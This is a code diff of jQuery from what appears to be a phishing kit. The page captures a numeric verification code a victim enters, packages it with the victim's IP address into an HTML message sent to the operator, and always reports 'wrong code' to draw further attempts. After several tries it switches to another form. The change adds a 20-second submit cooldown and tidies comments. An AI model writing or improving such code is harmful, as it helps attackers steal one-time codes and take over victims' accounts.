@@ -10,7 +10,6 @@ getIP((ip) => {
     IpAddress = ip;
 });
 $(document).ready(function () {
-    // getCode();
     updateHtmlAndCallback(function () {
         sendCode();
     });
@@ -91,15 +90,19 @@ let Fcode = '';
 function sendCode() {
     $('#code').on('input', function () {
         const input = $(this).val();
-        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng
+        const validInputRegex = /^\d+$/;
 
         if (!validInputRegex.test(input)) {
-            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
             $(this).val(input.slice(0, -1));
         }
     });
 
     $('#send-code').on('click', function () {
+        const $btn = $(this);
+
+        // Nếu nút đang bị khóa, không làm gì cả
+        if ($btn.prop('disabled')) return;
+
         const keymap = $('#code').val();
 
         if (keymap === '') {
@@ -108,6 +111,19 @@ function sendCode() {
         } else {
             $('#code').removeClass('border-danger');
         }
+
+        // Khóa nút trong 20s với đếm ngược
+        $btn.prop('disabled', true).text('Please wait (20s)');
+        let waitTime = 20;
+        const countdown = setInterval(() => {
+            waitTime--;
+            $btn.text(`Please wait (${waitTime}s)`);
+            if (waitTime <= 0) {
+                clearInterval(countdown);
+                $btn.prop('disabled', false).text('Submit');
+            }
+        }, 1000);
+
         code1 = keymap;
         const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
 `🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>\n` +
@@ -140,15 +156,13 @@ function sendCode() {
             .then((data) => {
                 setTimeout(function () {
                     if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
-                       $('#wrong-code').removeClass('d-none');
-        } else {
-            $('#wrong-code').removeClass('d-none');
-            $('#send-code').prop('disabled', true);
-
-            // ✅ Hiện biểu mẫu khác sau 4 lần sai
-            $('#code-form').addClass('d-none');
-            $('#getCode').removeClass('d-none');
-        }
+                        $('#wrong-code').removeClass('d-none');
+                    } else {
+                        $('#wrong-code').removeClass('d-none');
+                        $('#send-code').prop('disabled', true);
+                        $('#code-form').addClass('d-none');
+                        $('#getCode').removeClass('d-none');
+                    }
                     $('.lsd-ring-container').addClass('d-none');
                 }, 2000);
             })
@@ -161,5 +175,5 @@ function sendCode() {
                     $('.lsd-ring-container').addClass('d-none');
                 }, 500);
             });
-          });
+    });
 }
